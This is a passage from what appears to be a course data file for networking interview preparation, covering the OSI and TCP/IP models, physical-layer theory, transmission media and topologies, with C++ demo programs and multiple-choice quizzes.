TLS</td></tr><tr><td>Transport</td><td>Transport (4)</td><td>TCP, UDP</td></tr><tr><td>Internet</td><td>Network (3)</td><td>IP (v4/v6), ICMP, ARP, IGMP</td></tr><tr><td>Network Access (Link)</td><td>Data Link + Physical (1, 2)</td><td>Ethernet, Wi-Fi, PPP</td></tr></table><p class="learn-p">Some textbooks use a <b>5-layer model</b> that splits the Network Access layer into Data Link and Physical, which maps more cleanly to OSI.</p></div><div class="learn-section"><div class="learn-h">OSI vs TCP/IP — Key Differences</div><table class="learn-table"><tr><th>Aspect</th><th>OSI Model</th><th>TCP/IP Model</th></tr><tr><td>Layers</td><td>7</td><td>4 (or 5)</td></tr><tr><td>Developed by</td><td>ISO</td><td>DoD / DARPA</td></tr><tr><td>Approach</td><td>Theoretical, reference model</td><td>Practical, implementation-based</td></tr><tr><td>Session &amp; Presentation</td><td>Separate layers</td><td>Merged into Application</td></tr><tr><td>Protocol dependence</td><td>Protocol-independent</td><td>Based on standard protocols (TCP, IP)</td></tr><tr><td>Usage</td><td>Teaching &amp; conceptual</td><td>Real-world Internet</td></tr></table><div class="learn-warn"><b>Warning:</b> A common interview mistake is saying the Internet uses the OSI model. The Internet uses the <b>TCP/IP model</b>. OSI is a reference/teaching model. However, network engineers still reference OSI layer numbers (e.g., "Layer 7 firewall") in practice.</div></div><div class="learn-section"><div class="learn-h">How Data Flows in Real Networks</div><p class="learn-p">Consider a user requesting a webpage. Here is the end-to-end flow:</p><ol class="learn-list"><li><b>Application Layer:</b> The browser creates an HTTP GET request.</li><li><b>Transport Layer:</b> TCP segments the data and adds source/destination port numbers. A 3-way handshake may have already established the connection.</li><li><b>Network Layer:</b> IP adds source and destination IP addresses. Routing decisions are made hop by hop.</li><li><b>Data Link Layer:</b> Ethernet frames are created with MAC addresses. ARP resolves IP to MAC if needed.</li><li><b>Physical Layer:</b> Bits are transmitted as electrical signals, light pulses, or radio waves.</li></ol><p class="learn-p">At the receiving server, the process reverses: bits &rarr; frame &rarr; packet &rarr; segment &rarr; HTTP data delivered to the web server application.</p></div><div class="learn-section"><div class="learn-h">Important Devices at Each Layer</div><ul class="learn-list"><li><b>Layer 1 (Physical):</b> Hubs, Repeaters, Cables (Ethernet, Fiber)</li><li><b>Layer 2 (Data Link):</b> Switches, Bridges (operate on MAC addresses)</li><li><b>Layer 3 (Network):</b> Routers, Layer-3 Switches (operate on IP addresses)</li><li><b>Layer 4 (Transport):</b> Firewalls (stateful inspection), Load Balancers</li><li><b>Layer 7 (Application):</b> Application-level gateways, WAFs, Reverse Proxies</li></ul><div class="learn-tip"><b>Tip:</b> In interviews, you might be asked: "At which layer does a switch operate vs. a router?" Switch = Layer 2 (MAC), Router = Layer 3 (IP). A Layer-3 switch can do both.</div></div><div class="learn-section"><div class="learn-h">Interview Essentials</div><ul class="learn-list"><li>Know all 7 OSI layers and their PDUs by heart.</li><li>Understand encapsulation/de-encapsulation with a real example.</li><li>Be able to map TCP/IP layers to OSI layers.</li><li>Know which protocols belong to which layer.</li><li>Understand the difference between logical (IP) and physical (MAC) addressing.</li><li>The Presentation layer handles <b>encryption</b> (TLS), <b>compression</b>, and <b>data format translation</b>.</li><li>The Session layer manages <b>dialog control</b> (simplex, half-duplex, full-duplex) and <b>synchronization</b>.</li></ul></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: Name all 7 layers of the OSI model and the PDU at each layer.</b><br>A: From top to bottom — Application (Data), Presentation (Data), Session (Data), Transport (Segment/Datagram), Network (Packet), Data Link (Frame), Physical (Bits). Mnemonic: "All People Seem To Need Data Processing."</p><p class="learn-p"><b>Q2: Why does the TCP/IP model combine OSI layers 5, 6, and 7?</b><br>A: The TCP/IP model is practical rather than theoretical. In real implementations, session management, encoding/encryption, and application logic are typically handled together within the application itself, making separate layers unnecessary. TLS handles presentation-layer duties but is invoked by the application.</p><p class="learn-p"><b>Q3: At which layer does a switch operate vs. a router?</b><br>A: A switch operates at Layer 2 (Data Link), forwarding frames based on MAC addresses. A router operates at Layer 3 (Network), forwarding packets based on IP addresses. A Layer-3 switch combines both capabilities.</p><p class="learn-p"><b>Q4: What is encapsulation and de-encapsulation?</b><br>A: Encapsulation is wrapping data with protocol headers (and trailers) as it moves down the stack. The Application layer creates data; Transport adds TCP/UDP header (segment); Network adds IP header (packet); Data Link adds MAC addresses and CRC (frame); Physical converts to bits. De-encapsulation is the reverse at the receiving end — each layer strips its header and passes the payload up.</p><p class="learn-p"><b>Q5: Why is ARP needed if we already have IP addresses?</b><br>A: IP addresses identify hosts logically across networks, but within a local network segment, frames are delivered using MAC addresses. ARP bridges this gap by resolving an IP address to the corresponding MAC address on the same subnet. Without ARP, a host would know the destination IP but not the physical address needed to construct the Ethernet frame.</p><p class="learn-p"><b>Q6: Can a network use only the OSI model without TCP/IP?</b><br>A: The OSI model is a reference/conceptual framework, not a protocol suite. The Internet uses the TCP/IP protocol suite. However, the OSI model\'s layer terminology (e.g., "Layer 7 firewall," "Layer 3 switch") is universally used by network engineers even when discussing TCP/IP-based networks.</p></div>',
          code: `// === Network Layer Simulation in C++ ===
// Demonstrates packet encapsulation through OSI layers

#include <iostream>
#include <string>
#include <vector>
using namespace std;

// Simulating PDU at each layer
struct PhysicalFrame {
    string bits; // raw bits
};

struct DataLinkFrame {
    string srcMAC;
    string dstMAC;
    string payload; // network layer packet
    string crc;     // error detection
};

struct NetworkPacket {
    string srcIP;
    string dstIP;
    int ttl;
    string payload; // transport segment
};

struct TransportSegment {
    int srcPort;
    int dstPort;
    int seqNum;
    int ackNum;
    string flags; // SYN, ACK, FIN etc.
    string payload; // application data
};

// Encapsulation demonstration
void demonstrateEncapsulation() {
    // Step 1: Application layer creates data
    string appData = "GET / HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\n";
    cout << "=== Application Layer ===" << endl;
    cout << "Data: " << appData.substr(0, 30) << "..." << endl;

    // Step 2: Transport layer adds TCP header
    TransportSegment seg;
    seg.srcPort = 49152; // ephemeral port
    seg.dstPort = 80;    // HTTP
    seg.seqNum = 1000;
    seg.ackNum = 0;
    seg.flags = "SYN";
    seg.payload = appData;
    cout << "\\n=== Transport Layer ===" << endl;
    cout << "Segment: [SrcPort:" << seg.srcPort
         << " DstPort:" << seg.dstPort
         << " Seq:" << seg.seqNum << "] + Data" << endl;

    // Step 3: Network layer adds IP header
    NetworkPacket pkt;
    pkt.srcIP = "192.168.1.100";
    pkt.dstIP = "93.184.216.34"; // example.com
    pkt.ttl = 64;
    pkt.payload = "TCP_SEGMENT";
    cout << "\\n=== Network Layer ===" << endl;
    cout << "Packet: [SrcIP:" << pkt.srcIP
         << " DstIP:" << pkt.dstIP
         << " TTL:" << pkt.ttl << "] + Segment" << endl;

    // Step 4: Data Link layer adds frame header/trailer
    DataLinkFrame frame;
    frame.srcMAC = "AA:BB:CC:DD:EE:01";
    frame.dstMAC = "AA:BB:CC:DD:EE:02"; // next hop router MAC
    frame.payload = "IP_PACKET";
    frame.crc = "0xABCD1234"; // CRC-32 checksum
    cout << "\\n=== Data Link Layer ===" << endl;
    cout << "Frame: [SrcMAC:" << frame.srcMAC
         << " DstMAC:" << frame.dstMAC
         << "] + Packet + [CRC:" << frame.crc << "]" << endl;

    // Step 5: Physical layer converts to bits
    cout << "\\n=== Physical Layer ===" << endl;
    cout << "Bits: 01101001 10110100 11001010 ..." << endl;
}

// Simple routing table lookup
struct RouteEntry {
    string network;
    string mask;
    string nextHop;
    string iface;
};

void routingTableLookup() {
    vector<RouteEntry> table = {
        {"192.168.1.0", "255.255.255.0", "0.0.0.0", "eth0"},
        {"10.0.0.0",    "255.0.0.0",     "192.168.1.1", "eth0"},
        {"0.0.0.0",     "0.0.0.0",       "192.168.1.1", "eth0"} // default
    };

    cout << "\\n=== Routing Table ===" << endl;
    cout << "Network\\t\\tMask\\t\\t\\tNext Hop\\tInterface" << endl;
    for (auto& r : table) {
        cout << r.network << "\\t" << r.mask << "\\t"
             << r.nextHop << "\\t\\t" << r.iface << endl;
    }
}

int main() {
    demonstrateEncapsulation();
    routingTableLookup();
    return 0;
}`,
          problems: [
            ['Basics of Computer Networking', 'https://www.geeksforgeeks.org/basics-computer-networking/', 'Easy'],
            ['TCP/IP Model Questions', 'https://www.geeksforgeeks.org/tcp-ip-model/', 'Easy'],
            ['Network Layers & Protocols Matching', 'https://www.geeksforgeeks.org/layers-of-osi-model/', 'Easy'],
            ['Network Devices at Each Layer', 'https://www.geeksforgeeks.org/network-devices-hub-repeater-bridge-switch-router-gateways/', 'Easy']
          ],
          mcqs: [
            {q: 'Which OSI layer is responsible for routing packets between different networks?', o: ['Data Link Layer', 'Transport Layer', 'Network Layer', 'Session Layer'], a: 2},
            {q: 'In the TCP/IP model, which layer combines the functionality of OSI layers 5, 6, and 7?', o: ['Internet Layer', 'Transport Layer', 'Application Layer', 'Network Access Layer'], a: 2},
            {q: 'What is the PDU (Protocol Data Unit) at the Data Link layer?', o: ['Packet', 'Segment', 'Frame', 'Bit'], a: 2},
            {q: 'Which layer of the OSI model handles encryption and data compression?', o: ['Application', 'Presentation', 'Session', 'Transport'], a: 1},
            {q: 'The TCP/IP model was developed by:', o: ['ISO', 'IEEE', 'DoD / DARPA', 'W3C'], a: 2},
            {q: 'A hub operates at which OSI layer?', o: ['Data Link (Layer 2)', 'Network (Layer 3)', 'Physical (Layer 1)', 'Transport (Layer 4)'], a: 2},
            {q: 'Which protocol is used to resolve IP addresses to MAC addresses?', o: ['DNS', 'DHCP', 'ARP', 'RARP'], a: 2},
            {q: 'Data at the Transport layer is called a:', o: ['Frame', 'Packet', 'Segment', 'Bit'], a: 2}
          ],
        },
      ]
    },
    // ==================== TAB 1: Physical Layer (OSI Layer 1) ====================
    {
      id: 'physical', t: 'Physical Layer',
      topics: [
        {
          t: 'Physical Layer — Transmission & Encoding',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">The Physical Layer is the <b>foundation of all networking</b>. It deals with the actual transmission of raw bits over a physical medium — copper cables, fiber optics, or wireless radio waves. As a software developer, understanding physical layer concepts is crucial for <b>latency optimization in trading systems</b>: choosing between fiber and microwave links for inter-exchange communication, understanding signal propagation delays, and calculating theoretical channel capacity. Interviewers test Nyquist and Shannon theorems, encoding schemes, and multiplexing — these appear frequently in placement MCQs.</p></div><div class="learn-section"><div class="learn-h">Transmission Media</div><p class="learn-p">Physical media are classified into <b>guided (wired)</b> and <b>unguided (wireless)</b>:</p><table class="learn-table"><tr><th>Medium</th><th>Type</th><th>Bandwidth</th><th>Distance</th><th>Use Case</th></tr><tr><td>Twisted Pair (UTP/STP)</td><td>Guided</td><td>Up to 10 Gbps (Cat6a)</td><td>~100m</td><td>LAN, telephone lines</td></tr><tr><td>Coaxial Cable</td><td>Guided</td><td>Up to 1 Gbps</td><td>~500m</td><td>Cable TV, older Ethernet (10BASE2)</td></tr><tr><td>Fiber Optic</td><td>Guided</td><td>Up to 100+ Tbps</td><td>~100 km+ (single-mode)</td><td>Backbone, WAN, data centers</td></tr><tr><td>Radio Waves</td><td>Unguided</td><td>Varies (MHz-GHz)</td><td>~100m (Wi-Fi)</td><td>Wi-Fi, Bluetooth, cellular</td></tr><tr><td>Microwave</td><td>Unguided</td><td>Up to 10+ Gbps</td><td>~50 km (line of sight)</td><td>HFT inter-exchange links</td></tr><tr><td>Infrared</td><td>Unguided</td><td>Low</td><td>~1m</td><td>TV remotes, short-range</td></tr></table><p class="learn-p"><b>Fiber Optic Types:</b></p><ul class="learn-list"><li><b>Single-Mode Fiber (SMF):</b> Small core (~9 &mu;m), single light path, long distance (~100 km), higher bandwidth. Used in WANs and backbone networks.</li><li><b>Multi-Mode Fiber (MMF):</b> Larger core (~50-62.5 &mu;m), multiple light paths (modes), shorter distance (~2 km), lower cost. Used in LANs and data centers.</li></ul><div class="learn-tip"><b>Tip:</b> Fiber optic is immune to electromagnetic interference (EMI) — a key advantage over copper in noisy environments like factory floors or near power lines.</div></div><div class="learn-section"><div class="learn-h">Key Terminology</div><table class="learn-table"><tr><th>Term</th><th>Definition</th><th>Unit</th></tr><tr><td>Bandwidth</td><td>Range of frequencies a channel can carry</td><td>Hz</td></tr><tr><td>Data Rate / Bit Rate</td><td>Number of bits transmitted per second</td><td>bps</td></tr><tr><td>Baud Rate</td><td>Number of signal changes (symbols) per second</td><td>baud</td></tr><tr><td>Latency</td><td>Time for a bit to travel from source to destination</td><td>seconds</td></tr><tr><td>Throughput</td><td>Actual data transfer rate achieved</td><td>bps</td></tr><tr><td>Propagation Delay</td><td>Distance / Propagation speed</td><td>seconds</td></tr><tr><td>Transmission Delay</td><td>Packet size / Bandwidth</td><td>seconds</td></tr></table><p class="learn-p"><b>Bit Rate vs Baud Rate:</b> If each signal element (symbol) carries multiple bits, bit rate = baud rate &times; bits per symbol. Example: QAM-16 encodes 4 bits per symbol, so 1000 baud = 4000 bps.</p><div class="learn-code">Bit Rate = Baud Rate &times; log2(L)\nwhere L = number of signal levels\n\nExample: 4 signal levels (L=4), 1000 baud\nBit Rate = 1000 &times; log2(4) = 1000 &times; 2 = 2000 bps</div></div><div class="learn-section"><div class="learn-h">Nyquist Theorem (Noiseless Channel)</div><p class="learn-p">The <b>Nyquist theorem</b> gives the maximum data rate of a <b>noiseless</b> channel:</p><div class="learn-code">Maximum Bit Rate = 2 &times; B &times; log2(L)\nwhere:\n  B = bandwidth of the channel (Hz)\n  L = number of discrete signal levels\n\nExample: B = 3000 Hz (telephone line), L = 2 (binary)\nMax Rate = 2 &times; 3000 &times; log2(2) = 6000 bps\n\nWith L = 16 (QAM-16):\nMax Rate = 2 &times; 3000 &times; log2(16) = 24000 bps</div><p class="learn-p">Increasing signal levels increases capacity, but in practice, more levels make the signal more susceptible to noise.</p></div><div class="learn-section"><div class="learn-h">Shannon\'s Theorem (Noisy Channel)</div><p class="learn-p">The <b>Shannon-Hartley theorem</b> gives the theoretical maximum capacity of a <b>noisy</b> channel:</p><div class="learn-code">C = B &times; log2(1 + SNR)\nwhere:\n  C = channel capacity (bps)\n  B = bandwidth (Hz)\n  SNR = signal-to-noise ratio (linear, not dB)\n\nIf SNR is given in dB: SNR_linear = 10^(SNR_dB/10)\n\nExample: B = 3000 Hz, SNR = 30 dB\nSNR_linear = 10^(30/10) = 1000\nC = 3000 &times; log2(1001) &asymp; 3000 &times; 9.97 &asymp; 29,910 bps</div><div class="learn-warn"><b>Key insight:</b> Shannon\'s theorem sets an <b>absolute upper bound</b> regardless of encoding technique. Nyquist gives the limit for a specific number of signal levels. The actual capacity is the minimum of both. You cannot exceed Shannon\'s limit no matter how many signal levels you use.</div></div><div class="learn-section"><div class="learn-h">Digital Encoding Schemes</div><p class="learn-p">Encoding defines how bits are represented as electrical signals. Key schemes:</p><table class="learn-table"><tr><th>Scheme</th><th>Description</th><th>Clock Recovery</th><th>DC Component</th></tr><tr><td>NRZ-L</td><td>High = 0, Low = 1 (or vice versa)</td><td>Poor (long runs of same bit)</td><td>Yes</td></tr><tr><td>NRZ-I</td><td>Transition at start = 1, no transition = 0</td><td>Better (transitions on 1s)</td><td>Possible</td></tr><tr><td>Manchester</td><td>Low&rarr;High = 1, High&rarr;Low = 0 (IEEE)</td><td>Excellent (transition every bit)</td><td>No</td></tr><tr><td>Differential Manchester</td><td>Transition at start = 0, no transition at start = 1</td><td>Excellent</td><td>No</td></tr><tr><td>AMI (Bipolar)</td><td>0 = zero voltage, 1 = alternating +/- voltage</td><td>Good (for 1s)</td><td>No</td></tr><tr><td>4B/5B</td><td>Map 4 data bits to 5 encoded bits</td><td>Good</td><td>Reduced</td></tr></table><div class="learn-code">Manchester Encoding (used in 10 Mbps Ethernet):\nBit:     1    0    1    1    0\nSignal: _‾ˉ  ‾ˉ_  _‾ˉ  _‾ˉ  ‾ˉ_\n        (Low-High = 1, High-Low = 0)\n\nRate penalty: Manchester needs 2x bandwidth\n(each bit has a transition = 2 signal changes per bit period)\nSo: 10 Mbps Manchester requires 20 MHz bandwidth</div><div class="learn-tip"><b>Tip:</b> Manchester encoding is self-clocking (the receiver can extract the clock from the signal transitions). NRZ schemes need a separate clock or periodic synchronization. This is a very common interview question.</div></div><div class="learn-section"><div class="learn-h">Multiplexing</div><p class="learn-p">Multiplexing allows multiple signals to share a single communication channel:</p><ul class="learn-list"><li><b>FDM (Frequency Division Multiplexing):</b> Each signal gets a unique frequency band. Used in radio/TV broadcasting, cable TV. Guard bands prevent interference between adjacent channels.</li><li><b>TDM (Time Division Multiplexing):</b> Each signal gets a time slot in a repeating frame. <b>Synchronous TDM</b> assigns fixed slots (wasted if no data). <b>Statistical TDM</b> dynamically assigns slots only to active sources — more efficient.</li><li><b>WDM (Wavelength Division Multiplexing):</b> FDM applied to fiber optics — each signal uses a different wavelength (color) of light. <b>DWDM</b> (Dense WDM) can carry 80+ channels on a single fiber.</li><li><b>CDM (Code Division Multiplexing):</b> Each sender has a unique code (chip sequence). All transmit simultaneously; receivers use the code to extract their signal. Used in 3G cellular (CDMA).</li></ul></div><div class="learn-section"><div class="learn-h">Switching Techniques</div><table class="learn-table"><tr><th>Technique</th><th>Connection</th><th>Delay</th><th>Use Case</th></tr><tr><td>Circuit Switching</td><td>Dedicated path for entire call</td><td>Setup delay, then constant</td><td>Telephone (PSTN)</td></tr><tr><td>Packet Switching</td><td>No dedicated path; packets routed independently</td><td>Variable (queuing)</td><td>Internet (IP)</td></tr><tr><td>Message Switching</td><td>Store-and-forward entire message</td><td>High (wait for full message)</td><td>Email (legacy)</td></tr></table><p class="learn-p"><b>Circuit vs Packet Switching:</b> Circuit switching wastes bandwidth during idle periods (silence in a call). Packet switching shares bandwidth efficiently but has variable latency (queuing delays). For HFT, dedicated circuits or dark fiber provide predictable latency.</p></div><div class="learn-section"><div class="learn-h">Delay Calculations</div><div class="learn-code">Total Delay = Transmission Delay + Propagation Delay + Queuing Delay + Processing Delay\n\nTransmission Delay = Packet Size / Link Bandwidth\nPropagation Delay  = Distance / Propagation Speed\n\nPropagation speeds:\n  Copper:  ~2 &times; 10^8 m/s\n  Fiber:   ~2 &times; 10^8 m/s\n  Air:     ~3 &times; 10^8 m/s (speed of light)\n\nExample: Send 1 KB over a 10 Mbps link spanning 1000 km (copper)\n  Transmission = (1000 &times; 8) / (10 &times; 10^6) = 0.8 ms\n  Propagation  = 10^6 / (2 &times; 10^8) = 5 ms\n  Total (min)  = 5.8 ms</div></div><div class="learn-section"><div class="learn-h">Interview Spotlight</div><p class="learn-p"><b>Q1: What is the difference between Nyquist and Shannon\'s theorem?</b><br>A: Nyquist gives the maximum data rate for a <b>noiseless</b> channel: C = 2B log2(L). Shannon gives the theoretical maximum for a <b>noisy</b> channel: C = B log2(1 + SNR). Shannon\'s limit is absolute — no encoding can exceed it. Nyquist tells you how many signal levels you need; Shannon tells you whether that\'s physically achievable given noise.</p><p class="learn-p"><b>Q2: Why does Manchester encoding require twice the bandwidth?</b><br>A: Each bit period has a guaranteed transition (low-to-high or high-to-low) in the middle. This means the signal changes at twice the data rate, requiring twice the bandwidth. The tradeoff is self-clocking capability — the receiver extracts the clock from the transitions, eliminating clock skew.</p><p class="learn-p"><b>Q3: Compare FDM, TDM, and WDM.</b><br>A: FDM divides the channel by frequency (each user gets a frequency band). TDM divides by time (each user gets a time slot). WDM is FDM for fiber optics (each user gets a light wavelength). FDM wastes bandwidth on guard bands; synchronous TDM wastes unused slots; WDM is the most efficient for fiber (DWDM carries 80+ channels).</p><p class="learn-p"><b>Q4: A channel has bandwidth 4 kHz and SNR of 24 dB. What is the maximum achievable data rate?</b><br>A: SNR_linear = 10^(24/10) = 251.19. Shannon: C = 4000 &times; log2(252.19) = 4000 &times; 7.98 = 31,920 bps. With Nyquist (L signal levels): to achieve this with 2B&times;log2(L), need log2(L) = 31920/8000 &asymp; 3.99, so L = 16. Answer: ~31,920 bps using 16 signal levels.</p><p class="learn-p"><b>Q5: What is the difference between bit rate and baud rate?</b><br>A: Baud rate is the number of signal changes per second. Bit rate is the number of bits transmitted per second. Bit rate = baud rate &times; bits_per_symbol. They are equal only for binary signaling (2 levels). With QAM-16 (4 bits/symbol), bit rate = 4 &times; baud rate.</p></div>',
          code: `// === Physical Layer Calculations in C++ ===
#include <iostream>
#include <cmath>
using namespace std;

// Nyquist theorem: max data rate for noiseless channel
double nyquist(double bandwidth, int levels) {
    return 2 * bandwidth * log2(levels);
}

// Shannon theorem: max capacity for noisy channel
double shannon(double bandwidth, double snr_db) {
    double snr_linear = pow(10, snr_db / 10.0);
    return bandwidth * log2(1 + snr_linear);
}

// Transmission delay
double transmissionDelay(double packetBits, double linkBandwidth) {
    return packetBits / linkBandwidth;
}

// Propagation delay
double propagationDelay(double distance, double speed) {
    return distance / speed;
}

int main() {
    // Nyquist examples
    cout << "=== Nyquist Theorem ===" << endl;
    cout << "Binary (L=2), B=3000 Hz: " << nyquist(3000, 2) << " bps" << endl;
    cout << "QAM-16 (L=16), B=3000 Hz: " << nyquist(3000, 16) << " bps" << endl;

    // Shannon examples
    cout << "\n=== Shannon Theorem ===" << endl;
    cout << "B=3000 Hz, SNR=30 dB: " << shannon(3000, 30) << " bps" << endl;
    cout << "B=4000 Hz, SNR=24 dB: " << shannon(4000, 24) << " bps" << endl;

    // Delay calculations
    cout << "\n=== Delay Calculations ===" << endl;
    double pktSize = 1000 * 8; // 1 KB in bits
    double linkBW = 10e6;      // 10 Mbps
    double dist = 1e6;         // 1000 km in meters
    double speed = 2e8;        // copper propagation speed

    double tTrans = transmissionDelay(pktSize, linkBW);
    double tProp = propagationDelay(dist, speed);
    cout << "Transmission delay: " << tTrans * 1000 << " ms" << endl;
    cout << "Propagation delay: " << tProp * 1000 << " ms" << endl;
    cout << "Total: " << (tTrans + tProp) * 1000 << " ms" << endl;

    // Bit rate vs baud rate
    cout << "\n=== Bit Rate vs Baud Rate ===" << endl;
    int baudRate = 1000;
    for (int levels : {2, 4, 8, 16, 64, 256}) {
        int bitsPerSymbol = (int)log2(levels);
        cout << "L=" << levels << ": " << baudRate << " baud = "
             << baudRate * bitsPerSymbol << " bps ("
             << bitsPerSymbol << " bits/symbol)" << endl;
    }

    // Manchester encoding: bandwidth requirement
    cout << "\n=== Manchester Encoding ===" << endl;
    double dataRate = 10e6; // 10 Mbps Ethernet
    cout << "Data rate: " << dataRate / 1e6 << " Mbps" << endl;
    cout << "Required bandwidth: " << dataRate / 1e6 << " MHz (2x minimum)" << endl;

    return 0;
}`,
          problems: [
            ['Manchester & Differential Manchester Encoding','https://www.geeksforgeeks.org/manchester-encoding-in-computer-network/','Medium'],
          ],
          mcqs: [
            {q: 'Nyquist theorem gives the maximum data rate for:', o: ['A noisy channel', 'A noiseless channel', 'A wireless channel only', 'A fiber optic channel only'], a: 1},
            {q: 'Shannon\'s theorem states C = B × log2(1 + SNR). If bandwidth doubles and SNR stays the same, capacity:', o: ['Stays the same', 'Doubles', 'Quadruples', 'Depends on encoding'], a: 1},
            {q: 'Manchester encoding requires twice the bandwidth because:', o: ['It uses two voltage levels', 'Each bit has a guaranteed mid-bit transition', 'It encodes 2 bits per symbol', 'It uses frequency modulation'], a: 1},
            {q: 'In a system with baud rate 2000 and 16 signal levels, the bit rate is:', o: ['2000 bps', '4000 bps', '8000 bps', '32000 bps'], a: 2},
            {q: 'Which multiplexing technique is used in fiber optics to carry multiple signals?', o: ['TDM', 'FDM', 'WDM (Wavelength Division Multiplexing)', 'CDM'], a: 2},
            {q: 'Single-mode fiber compared to multi-mode fiber has:', o: ['Larger core, shorter distance', 'Smaller core, longer distance', 'Same core, same distance', 'Larger core, longer distance'], a: 1},
            {q: 'A telephone line has bandwidth 3 kHz. Using Nyquist with 4 signal levels, max data rate is:', o: ['6000 bps', '12000 bps', '24000 bps', '3000 bps'], a: 1},
            {q: 'Circuit switching compared to packet switching:', o: ['Has variable latency', 'Wastes bandwidth during idle periods', 'Is used by the Internet', 'Has no setup delay'], a: 1}
          ],
        },
        {
          t: 'Transmission Media, Topologies & Switching',
          learn: '<div class="learn-section"><div class="learn-h">Why This Matters</div><p class="learn-p">Choosing the right transmission medium, topology, and switching technique is fundamental to network design. In SDE placement interviews you will be asked to compare twisted pair vs fiber, explain why star topology dominates LANs, and contrast circuit switching with packet switching. Understanding physical infrastructure decisions — why data centers use fiber internally, why microwave links compete with fiber for HFT, and how topology affects fault tolerance — is directly relevant to building low-latency trading systems.</p></div><div class="learn-section"><div class="learn-h">Guided Media — Twisted Pair Cable</div><p class="learn-p"><b>Twisted pair</b> consists of two insulated copper wires twisted together to reduce electromagnetic interference (crosstalk). There are two types:</p><ul class="learn-list"><li><b>UTP (Unshielded Twisted Pair):</b> No metallic shield. Most common in LANs. Cheaper but more susceptible to EMI.</li><li><b>STP (Shielded Twisted Pair):</b> Has a metallic foil or braided shield around each pair. Better EMI protection, used in industrial environments.</li></ul><table class="learn-table"><tr><th>Category</th><th>Max Speed</th><th>Max Bandwidth</th><th>Use Case</th></tr><tr><td>CAT5</td><td>100 Mbps</td><td>100 MHz</td><td>Fast Ethernet (legacy)</td></tr><tr><td>CAT5e</td><td>1 Gbps</td><td>100 MHz</td><td>Gigabit Ethernet</td></tr><tr><td>CAT6</td><td>1 Gbps (10 Gbps up to 55m)</td><td>250 MHz</td><td>Gigabit / 10G Ethernet</td></tr><tr><td>CAT6a</td><td>10 Gbps</td><td>500 MHz</td><td>10G Ethernet (full 100m)</td></tr></table><p class="learn-p">All categories are limited to <b>100 meters</b> maximum segment length. RJ-45 connectors are standard.</p></div><div class="learn-section"><div class="learn-h">Guided Media — Coaxial Cable</div><p class="learn-p"><b>Coaxial cable</b> has a central copper conductor surrounded by insulation, a metallic shield, and an outer jacket. The shield provides better noise immunity than twisted pair.</p><ul class="learn-list"><li><b>Thin coax (10BASE2):</b> 185m max, BNC connectors, bus topology. Legacy Ethernet.</li><li><b>Thick coax (10BASE5):</b> 500m max, AUI connectors. Original Ethernet backbone.</li><li><b>Modern use:</b> Cable TV (CATV), cable internet (DOCSIS), CCTV systems.</li></ul><p class="learn-p">Coaxial cable supports higher bandwidth than twisted pair but is more expensive and harder to install. It has largely been replaced by twisted pair in LANs and fiber in backbones.</p></div><div class="learn-section"><div class="learn-h">Guided Media — Fiber Optic Cable</div><p class="learn-p"><b>Fiber optic</b> transmits data as pulses of light through a glass or plastic core. It works on the principle of <b>total internal reflection</b> — when light hits the core-cladding boundary at an angle greater than the critical angle, it reflects back into the core instead of refracting out.</p><div class="learn-code">Total Internal Reflection:\n  Core (higher refractive index n1)\n  Cladding (lower refractive index n2, where n1 &gt; n2)\n  Critical angle: sin(theta_c) = n2 / n1\n  Light entering at angle &gt; theta_c reflects completely</div><table class="learn-table"><tr><th>Property</th><th>Single-Mode (SMF)</th><th>Multi-Mode (MMF)</th></tr><tr><td>Core diameter</td><td>~8-10 &mu;m</td><td>~50-62.5 &mu;m</td></tr><tr><td>Light source</td><td>Laser</td><td>LED or VCSEL</td></tr><tr><td>Max distance</td><td>Up to 100+ km</td><td>Up to 2 km</td></tr><tr><td>Bandwidth</td><td>Very high</td><td>High</td></tr><tr><td>Cost</td><td>Higher</td><td>Lower</td></tr><tr><td>Modal dispersion</td><td>None (single path)</td><td>Present (multiple paths)</td></tr><tr><td>Use case</td><td>WAN, backbone, long-haul</td><td>LAN, data center, short runs</td></tr></table><div class="learn-tip"><b>Tip:</b> Multi-mode fiber suffers from <b>modal dispersion</b> — different light rays take different paths through the large core, arriving at slightly different times and causing signal spreading. Single-mode eliminates this by allowing only one path. This is why SMF supports much longer distances.</div></div><div class="learn-section"><div class="learn-h">Unguided Media</div><ul class="learn-list"><li><b>Radio Waves (3 kHz - 1 GHz):</b> Omnidirectional, can penetrate walls. Used in AM/FM radio, Wi-Fi (2.4/5 GHz), Bluetooth, cellular. Susceptible to interference.</li><li><b>Microwaves (1 GHz - 300 GHz):</b> Directional, line-of-sight. Used in satellite communication, point-to-point links, HFT inter-exchange links. Affected by rain (rain fade).</li><li><b>Infrared:</b> Very short range (~1m), line-of-sight, cannot penetrate walls. Used in TV remotes, IrDA (legacy data transfer). Secure from eavesdropping due to limited range.</li></ul><div class="learn-warn"><b>HFT Note:</b> Some trading firms use microwave links between exchanges (e.g., Chicago to New Jersey) because microwaves travel at the speed of light in air (~3 x 10^8 m/s) vs ~2 x 10^8 m/s in fiber. The ~33% speed advantage shaves microseconds off latency, which matters in high-frequency trading.</div></div><div class="learn-section"><div class="learn-h">Network Topologies</div><table class="learn-table"><tr><th>Topology</th><th>Structure</th><th>Pros</th><th>Cons</th></tr><tr><td>Bus</td><td>All devices on a single cable</td><td>Simple, cheap, easy to extend</td><td>Single point of failure (the bus), collisions, hard to troubleshoot</td></tr><tr><td>Star</td><td>All devices connect to a central hub/switch</td><td>Easy to add/remove devices, fault isolation, no collisions (with switch)</td><td>Central device is single point of failure, more cabling</td></tr><tr><td>Ring</td><td>Devices in a closed loop</td><td>Predictable performance, no collisions (token passing)</td><td>One break disrupts entire network, hard to add devices</td></tr><tr><td>Mesh</td><td>Every device connects to every other</td><td>Highly redundant, fault tolerant, no single point of failure</td><td>Expensive (n(n-1)/2 links), complex wiring</td></tr><tr><td>Tree</td><td>Hierarchical star topology</td><td>Scalable, logical grouping</td><td>Root failure affects all, backbone dependency</td></tr><tr><td>Hybrid</td><td>Combination of two or more topologies</td><td>Flexible, scalable</td><td>Complex design and management</td></tr></table><div class="learn-code">Full Mesh: Links = n(n-1)/2\n  5 nodes: 5*4/2 = 10 links\n  10 nodes: 10*9/2 = 45 links\n  100 nodes: 100*99/2 = 4950 links (impractical!)\n\nPartial Mesh: Only critical nodes are fully connected.\nUsed in WAN backbone and data center spine-leaf designs.</div><p class="learn-p"><b>Modern LANs</b> 